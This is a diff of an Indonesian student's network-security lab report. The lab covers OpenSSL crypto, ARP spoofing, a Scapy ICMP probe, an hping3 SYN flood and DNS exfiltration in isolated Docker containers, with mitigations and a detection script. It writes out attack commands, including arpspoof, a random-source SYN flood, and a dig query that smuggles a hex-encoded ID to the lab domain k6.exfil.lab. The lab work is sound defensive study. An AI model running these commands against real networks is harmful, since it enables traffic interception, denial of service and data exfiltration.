@@ -16,7 +16,7 @@
   * File Laporan: `laporan-k6.txt`
   * Kata Sandi Enkripsi: `kunci-k6-2026`
   * Domain Exfiltrasi: `k6.exfil.lab`
-  * Subjek Sertifikat: `/CN=k6.uts.local`
+  * Subjek Sertifikat: `/CN=k6.exfil.lab` *(disesuaikan dengan Domain Kasus pada PDF soal)*
   * Hex Payload NIM (`24552011240`): `3234353532303131323430` (Panjang: 22 karakter)
 
 ---
@@ -154,11 +154,9 @@ openssl dgst -sha256 -verify pub.pem -signature sig-asli.bin pesan-asli.txt
 echo "diubah" >> pesan-asli.txt
 openssl dgst -sha256 -verify pub.pem -signature sig-asli.bin pesan-asli.txt
 
-# 5. Pembuatan Sertifikat Self-Signed X.509 30 Hari (CN=k6.uts.local)
-openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local
-
+# 5. Pembuatan Sertifikat Self-Signed X.509 30 Hari (CN=k6.exfil.lab sesuai domain kasus pada PDF soal)
 # 6. Pemeriksaan Informasi Sertifikat X.509
-openssl x509 -in cert-k6.pem -noout -subject -issuer -dates
+docker run --rm -v "${PWD}:/work" uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.exfil.lab && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates"
 ```
 
 ### 2. Output Terminal Asli
@@ -182,13 +180,14 @@ Verification failure
 28EB2B4AC07E0000:error:1C880004:Provider routines:rsa_verify:RSA lib:providers/implementations/signature/rsa_sig.c:796:
 ```
 
-* **Output Informasi Sertifikat Self-Signed X.509 CN=k6.uts.local**:
+* **Output Informasi Sertifikat Self-Signed X.509 CN=k6.exfil.lab**:
 ```text
-subject=CN=k6.uts.local
-issuer=CN=k6.uts.local
-notBefore=Nov 15 11:38:58 2026 GMT
-notAfter=Dec 15 11:38:58 2026 GMT
+subject=CN=k6.exfil.lab
+issuer=CN=k6.exfil.lab
+notBefore=Nov 25 02:59:47 2026 GMT
+notAfter=Dec 25 02:59:47 2026 GMT
 ```
+*(Catatan: pada `02-dokumen/LEMBAR-PERINTAH-PER-KASUS.md` tertulis `/CN=k6.uts.local`, namun pada dokumen PDF soal UTS diminta CN sesuai domain kasus yakni `k6.exfil.lab`, sehingga sertifikat dibuat menggunakan `/CN=k6.exfil.lab` agar sepenuhnya selaras dengan soal ujian.)*
 
 ### 3. Bukti Tangkapan Layar
 <img src="./Screenshot Hasil/Tugas 2 - 1. Integritas Hash SHA-256 (PowerShell Get-FileHash).png" alt="Screenshot 4 - Integritas Hash SHA-256" width="100%">
@@ -201,7 +200,7 @@ notAfter=Dec 15 11:38:58 2026 GMT
 * **Kerahasiaan & Integritas Simetris**: Enkripsi AES-256 dalam mode Cipher Block Chaining (CBC) dengan salt dan algoritma derivasi kunci PBKDF2 menjamin kerahasiaan (*confidentiality*). Nilai hash SHA-256 dari `laporan-k6.txt` dan `hasil-k6.txt` terbukti identik (`ba00dcca033b5d1bcd46a143d134172554ea37b3a4849e4e98297e9846aaef54`), membuktikan integritas (*data integrity*) data terjaga sempurna setelah proses enkripsi dan dekripsi.
 * **Tanda Tangan Digital RSA & Non-Repudiation**: Pengujian verifikasi tanda tangan digital menghasilkan `Verified OK` saat file dalam kondisi asli. Ketika isi file diubah/ditamper (`echo "diubah" >> pesan-asli.txt`), proses verifikasi langsung gagal (`Verification failure`), membuktikan bahwa perubahan 1 byte pun akan membatalkan validitas signature digital.
 * **Perbedaan Sertifikat Self-Signed vs Sertifikat CA**:
-  Sertifikat *self-signed* ditandatangani oleh entitas pembuatnya sendiri sehingga nilai `Subject` dan `Issuer` bernilai sama (`CN=k6.uts.local`), cocok untuk lingkungan pengujian internal namun akan memicu peringatan *untrusted* pada browser/klien publik. Sebaliknya, sertifikat yang ditandatangani oleh *Certificate Authority (CA)* resmi divalidasi oleh pihak ketiga yang tepercaya berdasarkan rantai kepercayaan (*chain of trust*), sehingga diverifikasi otomatis oleh sistem operasi dan browser tanpa peringatan keamanan.
+  Sertifikat *self-signed* ditandatangani oleh entitas pembuatnya sendiri sehingga nilai `Subject` dan `Issuer` bernilai sama (`CN=k6.exfil.lab`), cocok untuk lingkungan pengujian internal namun akan memicu peringatan *untrusted* pada browser/klien publik. Sebaliknya, sertifikat yang ditandatangani oleh *Certificate Authority (CA)* resmi divalidasi oleh pihak ketiga yang tepercaya berdasarkan rantai kepercayaan (*chain of trust*), sehingga diverifikasi otomatis oleh sistem operasi dan browser tanpa peringatan keamanan.
 
 ---
 
@@ -209,8 +208,9 @@ notAfter=Dec 15 11:38:58 2026 GMT
 
 ### 1. Perintah yang Dijalankan
 ```bash
-# 1. Membuat jaringan bridge lab-arp-k6
-docker network create lab-arp-k6
+# 1. Membuat jaringan bridge terisolasi (--internal) lab-arp-k6 & verifikasi Internal=true
+docker network create --internal lab-arp-k6
+docker network inspect -f '{{.Name}}: Internal={{.Internal}}' lab-arp-k6
 
 # 2. Menjalankan 3 container dengan hak akses CAP_NET_ADMIN
 docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools
@@ -231,7 +231,7 @@ docker exec -d penyerang-k6 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
 docker exec korban-k6 arp -a
 
 # 7. Menerapkan mitigasi entri Static ARP pada korban
-docker exec korban-k6 arp -s 172.19.0.3 b2:8f:65:c5:3c:f0
+docker exec korban-k6 arp -s 172.19.0.3 b6:83:e0:60:01:ad
 
 # 8. Memeriksa kembali tabel ARP korban setelah mitigasi (Kondisi Terkunci PERM)
 docker exec korban-k6 arp -a
@@ -239,29 +239,29 @@ docker exec korban-k6 arp -a
 
 ### 2. Output Terminal Asli
 
-* **Pemetaan IP & MAC Address 3 Node**:
+* **Verifikasi Jaringan Internal & Pemetaan IP/MAC Address 3 Node**:
 ```text
-/korban-k6: IP=172.19.0.2, MAC=7e:b1:ef:89:12:68
-/gateway-k6: IP=172.19.0.3, MAC=b2:8f:65:c5:3c:f0
-/penyerang-k6: IP=172.19.0.4, MAC=86:2c:d9:de:fb:5d
+lab-arp-k6: Internal=true
+/korban-k6: IP=172.19.0.2, MAC=ce:5a:49:4c:6c:63
+/gateway-k6: IP=172.19.0.3, MAC=b6:83:e0:60:01:ad
+/penyerang-k6: IP=172.19.0.4, MAC=46:4c:72:54:8c:05
 ```
 
 * **Tabel ARP Korban Kondisi NORMAL**:
 ```text
-gateway-k6.lab-arp-k6 (172.19.0.3) at b2:8f:65:c5:3c:f0 [ether] on eth0
-penyerang-k6.lab-arp-k6 (172.19.0.4) at 86:2c:d9:de:fb:5d [ether] on eth0
+gateway-k6.lab-arp-k6 (172.19.0.3) at b6:83:e0:60:01:ad [ether] on eth0
 ```
 
 * **Tabel ARP Korban Saat Diserang `arpspoof` - TERINFEKSI**:
 ```text
-penyerang-k6.lab-arp-k6 (172.19.0.4) at 86:2c:d9:de:fb:5d [ether] on eth0
-gateway-k6.lab-arp-k6 (172.19.0.3) at 86:2c:d9:de:fb:5d [ether] on eth0
+penyerang-k6.lab-arp-k6 (172.19.0.4) at 46:4c:72:54:8c:05 [ether] on eth0
+gateway-k6.lab-arp-k6 (172.19.0.3) at 46:4c:72:54:8c:05 [ether] on eth0
 ```
 
 * **Tabel ARP Korban Pasca-Mitigasi Static ARP `PERM`**:
 ```text
-gateway-k6.lab-arp-k6 (172.19.0.3) at b2:8f:65:c5:3c:f0 [ether] PERM on eth0
-penyerang-k6.lab-arp-k6 (172.19.0.4) at 86:2c:d9:de:fb:5d [ether] on eth0
+penyerang-k6.lab-arp-k6 (172.19.0.4) at 46:4c:72:54:8c:05 [ether] on eth0
+gateway-k6.lab-arp-k6 (172.19.0.3) at b6:83:e0:60:01:ad [ether] PERM on eth0
 ```
 
 ### 3. Bukti Tangkapan Layar
@@ -274,8 +274,10 @@ penyerang-k6.lab-arp-k6 (172.19.0.4) at 86:2c:d9:de:fb:5d [ether] on eth0
 <img src="./Screenshot Hasil/Tugas 3 - 4.  Mitigasi Static ARP (PERM).png" alt="Screenshot 10 - Mitigasi Static ARP (PERM)" width="100%">
 
 ### 4. Analisis Teknis
-* **Mekanisme Serangan**: Protokol ARP bersifat *stateless* dan tidak memiliki mekanisme otentikasi. Penyerang memanfaatkan celah ini dengan mengirimkan paket *gratuitous ARP reply* palsu secara terus-menerus yang menyatakan bahwa IP gateway (`172.19.0.3`) diasosiasikan dengan MAC penyerang (`86:2c:d9:de:fb:5d`). Akibatnya, tabel ARP pada `korban-k6` teracuni (*ARP cache poisoning*), memungkinkan penyerang mencegat atau memanipulasi seluruh lalu lintas data (*Man-in-the-Middle*).
-* **Mekanisme Mitigasi**: Perintah `arp -s` mendaftarkan entri pemetaan IP-ke-MAC secara permanen (`PERM`) di memori kernel korban. Ketika entri berstatus static, kernel akan mengabaikan paket pembaruan ARP dinamis yang dikirim oleh penyerang, sehingga memulihkan dan mengunci asosiasi IP gateway ke MAC fisik aslinya (`b2:8f:65:c5:3c:f0`).
+* **Mekanisme Serangan**: Protokol ARP bersifat *stateless* dan tidak memiliki mekanisme otentikasi. Penyerang memanfaatkan celah ini dengan mengirimkan paket *gratuitous ARP reply* palsu secara terus-menerus yang menyatakan bahwa IP gateway (`172.19.0.3`) diasosiasikan dengan MAC penyerang (`46:4c:72:54:8c:05`). Akibatnya, tabel ARP pada `korban-k6` teracuni (*ARP cache poisoning*), memungkinkan penyerang mencegat atau memanipulasi seluruh lalu lintas data (*Man-in-the-Middle*).
+* **Mekanisme Mitigasi Static ARP**: Perintah `arp -s` mendaftarkan entri pemetaan IP-ke-MAC secara permanen (`PERM`) di memori kernel korban. Ketika entri berstatus static, kernel akan mengabaikan paket pembaruan ARP dinamis yang dikirim oleh penyerang, sehingga memulihkan dan mengunci asosiasi IP gateway ke MAC fisik aslinya (`b6:83:e0:60:01:ad`).
+* **Mitigasi Selain Static ARP (Dynamic ARP Inspection / DAI)**:
+  Selain mengunci tabel ARP secara manual pada masing-masing host dengan static ARP, pencegahan di tingkat infrastruktur jaringan dilakukan dengan mengaktifkan **Dynamic ARP Inspection (DAI)** pada switch Layer 2 yang dikombinasikan dengan **DHCP Snooping**. Switch akan menyimpan *DHCP Snooping Binding Table* (pemetaan sah antara IP, MAC Address, VLAN, dan port switch), lalu memverifikasi setiap paket ARP Reply/Request yang masuk; paket ARP dengan pemetaan IP-ke-MAC yang tidak cocok langsung di-*drop* oleh switch sebelum sempat meracuni tabel ARP korban.
 
 ---
 
@@ -389,24 +391,26 @@ sequenceDiagram
 
 ### 1. Perintah yang Dijalankan
 ```bash
-# Menjalankan skrip crafting paket ICMP Scapy dari uts-kali-tools ke container korban
+# Verifikasi status jaringan internal dan jalankan skrip crafting paket ICMP Scapy ke container korban
+docker network inspect -f '{{.Name}}: Internal={{.Internal}}' lab-arp-k6
 docker run --rm --network lab-arp-k6 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.19.0.2
 ```
 
 ### 2. Output Terminal Asli
 ```text
+lab-arp-k6: Internal=true
 Mengirim: IP / ICMP 172.19.0.5 > 172.19.0.2 echo-request 0
 TTL balasan: 64
 Tipe ICMP balasan: 0
 ```
 
 ### 3. Bukti Tangkapan Layar
-<img src="./Screenshot Hasil/Tugas 5 - 1. ICMP Scapy Echo Reply.png" alt="Screenshot 11 - ICMP Scapy Echo Reply" width="100%">
+<img src="./Screenshot Hasil/Tugas 5 - 1. ICMP Scapy Echo Reply.png" alt="Screenshot 12 - ICMP Scapy Echo Reply" width="100%">
 
 ### 4. Analisis Teknis & Pembahasan Smurf Attack
-* **Analisis Respon ICMP**: Skrip Python Scapy berhasil mengonstruksi header layer 3 (IP tujuan `172.19.0.2`) dan layer 4 (ICMP Type 8 Echo Request). Container korban merespons dengan paket ICMP Type 0 (*Echo Reply*) dengan nilai *Time to Live* (TTL) 64, yang menandakan bahwa tumpukan protokol jaringan (*network stack*) korban beroperasi normal dan merespons paket ICMP secara langsung tanpa terhalang filter firewall.
+* **Analisis Respon ICMP**: Skrip Python Scapy berhasil mengonstruksi header layer 3 (IP tujuan `172.19.0.2`) dan layer 4 (ICMP Type 8 Echo Request) di dalam jaringan terisolasi (`Internal=true`). Container korban merespons dengan paket ICMP Type 0 (*Echo Reply*) dengan nilai *Time to Live* (TTL) 64, yang menandakan bahwa tumpukan protokol jaringan (*network stack*) korban beroperasi normal dan merespons paket ICMP secara langsung tanpa terhalang filter firewall.
 * **Mekanisme Smurf Attack**:
-  Smurf Attack adalah bentuk serangan *Denial of Service (DoS)* terdistribusi yang memanfaatkan amplifikasi pesan ICMP. Penyerang memalsukan (*spoofing*) alamat IP sumber menjadi alamat IP target/korban, kemudian mengirimkan rentetan paket ICMP Echo Request ke alamat siaran (*broadcast address*) subnet lokal. 
+  Smurf Attack adalah bentuk serangan *Denial of Service (DoS)* berbasis **refleksi dan amplifikasi (*reflection & amplification attack*)** yang memanfaatkan pesan ICMP. Penyerang memalsukan (*spoofing*) alamat IP sumber menjadi alamat IP target/korban, kemudian mengirimkan rentetan paket ICMP Echo Request ke alamat siaran (*broadcast address*) jaringan lokal. 
   Setiap perangkat aktif dalam subnet yang menerima permintaan broadcast tersebut akan secara otomatis mengirimkan balasan ICMP Echo Reply ke alamat IP korban secara serentak. Akibatnya, bandwidth masuk dan kapasitas pemrosesan CPU korban akan terbebani secara masif (*bandwidth & resource exhaustion*), melumpuhkan layanan korban.
 * **Langkah Mitigasi**:
   1. Menonaktifkan penanganan broadcast ICMP pada setiap host sistem operasi (`net.ipv4.icmp_echo_ignore_broadcasts = 1`).
@@ -430,11 +434,11 @@ docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target sh -c 'net
 # 3. Melancarkan serangan DoS SYN Flood dengan IP acak selama 15 detik
 docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood --rand-source target
 
-# 4. Memeriksa kembali tabel koneksi saat serangan berlangsung (saat: 18) (Bukti Screenshot 12)
+# 4. Memeriksa kembali tabel koneksi saat serangan berlangsung (saat: 18) (Bukti Screenshot 13)
 docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant
 docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target sh -c 'netstat -ant | grep -c SYN_RECV'
 
-# 5. Menangkap paket Three-Way Handshake normal saat klien mengakses web target via tcpdump (Bukti Screenshot 13)
+# 5. Menangkap paket Three-Way Handshake normal saat klien mengakses web target via tcpdump (Bukti Screenshot 14)
 docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 5 tcpdump -i eth0 -nn -c 6 tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 3'
 
 # 6. Menghapus container dan jaringan compose
@@ -498,9 +502,9 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ```
 
 ### 3. Bukti Tangkapan Layar
-<img src="./Screenshot Hasil/Tugas 6 - 1. TCP SYN Flood SYN_RECV.png" alt="Screenshot 12 - TCP SYN Flood SYN_RECV" width="100%">
+<img src="./Screenshot Hasil/Tugas 6 - 1. TCP SYN Flood SYN_RECV.png" alt="Screenshot 13 - TCP SYN Flood SYN_RECV" width="100%">
 
-<img src="./Screenshot Hasil/Tugas 6 - 2. Three-Way Handshake tcpdump.png" alt="Screenshot 13 - Three-Way Handshake tcpdump" width="100%">
+<img src="./Screenshot Hasil/Tugas 6 - 2. Three-Way Handshake tcpdump.png" alt="Screenshot 14 - Three-Way Handshake tcpdump" width="100%">
 
 ### 4. Analisis Teknis & Mekanisme Mitigasi
 * **Analisis Serangan SYN Flood**: Protokol TCP mengandalkan jabat tangan tiga arah (*three-way handshake*). Jumlah antrean soket setengah terbuka (`SYN_RECV`) meningkat drastis dari **sebelum serangan: 0** menjadi **saat serangan berlangsung: 18** koneksi (terverifikasi via `grep -c SYN_RECV`). Pada kondisi normal, klien mengirimkan `SYN`, server membalas dengan `SYN-ACK`, dan mengalokasikan memori pada antrean *SYN backlog* berstatus `SYN_RECV` sambil menunggu `ACK` final dari klien. Pada serangan SYN Flood, penyerang mengirimkan ribuan paket `SYN` dengan alamat IP sumber palsu (*spoofed/randomized*). Server target terus menunggu balasan `ACK` yang tidak akan pernah tiba hingga antrean backlog penuh, mengakibatkan server menolak koneksi sah dari pengguna lain (*Denial of Service*).
@@ -534,13 +538,13 @@ docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "e
 # 3. Mengirimkan DNS query penyelundupan data (exfiltration) dengan payload hex sebagai subdomain ke DNS server lokal
 docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131323430.k6.exfil.lab "@dns"
 
-# 4. Memeriksa pencatatan riwayat query eksfiltrasi pada server dnsmasq (Bukti Screenshot 14)
+# 4. Memeriksa pencatatan riwayat query eksfiltrasi pada server dnsmasq (Bukti Screenshot 15)
 docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml logs dns
 
 # 5. Mendekode kembali payload hexadecimal menjadi plaintext NIM asli
 docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131323430 | xxd -r -p"
 
-# 6. Menyimpan log query DNS dan menjalankan skrip deteksi anomali berbasis Python (Bukti Screenshot 15)
+# 6. Menyimpan log query DNS dan menjalankan skrip deteksi anomali berbasis Python (Bukti Screenshot 16)
 docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml logs dns | Set-Content -Encoding utf8 dns-k6.log
 python kasus/k9-dns-detect/analisis_dns.py dns-k6.log
 
@@ -591,11 +595,16 @@ Query mencurigakan (label panjang berisi hex):
 ```
 
 ### 3. Bukti Tangkapan Layar
-<img src="./Screenshot Hasil/Tugas 7 - 1. DNS Exfiltration Query & Log dnsmasq.png" alt="Screenshot 14 - DNS Exfiltration Query & Log dnsmasq" width="100%">
+<img src="./Screenshot Hasil/Tugas 7 - 1. DNS Exfiltration Query & Log dnsmasq.png" alt="Screenshot 15 - DNS Exfiltration Query & Log dnsmasq" width="100%">
 
-<img src="./Screenshot Hasil/Tugas 7 - 2. Decode Payload NIM & Deteksi Log DNS.png" alt="Screenshot 15 - Decode Payload NIM & Deteksi Log DNS" width="100%">
+<img src="./Screenshot Hasil/Tugas 7 - 2. Decode Payload NIM & Deteksi Log DNS.png" alt="Screenshot 16 - Decode Payload NIM & Deteksi Log DNS" width="100%">
 
 ### 4. Analisis Teknis & Pembahasan Deteksi DNS Tunneling
+* **Label Hex yang Terdeteksi di Log `dnsmasq`**:
+  Pada berkas `dns-k6.log`, tercatat eksplisit entri kueri yang membawa label hex NIM mahasiswa (`3234353532303131323430`, panjang 22 karakter) menuju domain kasus `k6.exfil.lab`:
+  ```text
+  dns-1  | dnsmasq[1]: query[A] 3234353532303131323430.k6.exfil.lab from 172.21.0.3
+  ```
 * **Mekanisme DNS Exfiltration**:
   Protokol DNS (UDP port 53) umumnya diizinkan melewati firewall keluar (*egress filtering*) karena esensial untuk resolusi nama domain sistem. Pelaku ancaman (*attacker*) mengeksploitasi celah ini dengan mengonversi data rahasia (pada uji lab ini berupa NIM mahasiswa `24552011240`) menjadi format aman URL/hexadecimal (`3234353532303131323430`), kemudian menyisipkannya sebagai label subdomain pada kueri DNS (`<hex-payload>.k6.exfil.lab`). Ketika kueri tersebut sampai ke server DNS otoritatif penyerang, payload diekstraksi dari string kueri dan direkonstruksi kembali ke teks asli (`24552011240`) tanpa pernah memicu deteksi firewall transmisi HTTP/FTP konvensional.
 * **Evaluasi & Batasan Skrip Deteksi Heuristik (`analisis_dns.py`)**:
